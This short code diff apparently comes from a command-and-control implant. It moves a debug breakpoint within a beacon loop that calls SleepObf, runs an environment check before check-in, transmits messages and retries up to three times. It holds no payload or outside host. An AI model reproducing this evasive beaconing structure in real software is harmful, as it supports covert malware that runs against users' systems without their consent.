@@ -18,6 +18,7 @@ namespace Core {
         }
 
         do {
+            __debugbreak();
             SleepObf();
 
             if (!CheckTime()) {
@@ -26,15 +27,17 @@ namespace Core {
 
             if (!Ctx->Session.Checkin) {
                 SeCheckEnvironment();
+
                 if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                     return_defer(ntstatus);
                 }
             }
 
-            __debugbreak();
             MessageTransmit();
+
             if (ntstatus != ERROR_SUCCESS) {
                 Ctx->Session.Retry++;
+
                 if (Ctx->Session.Retry == 3) {
                     break;
                 }
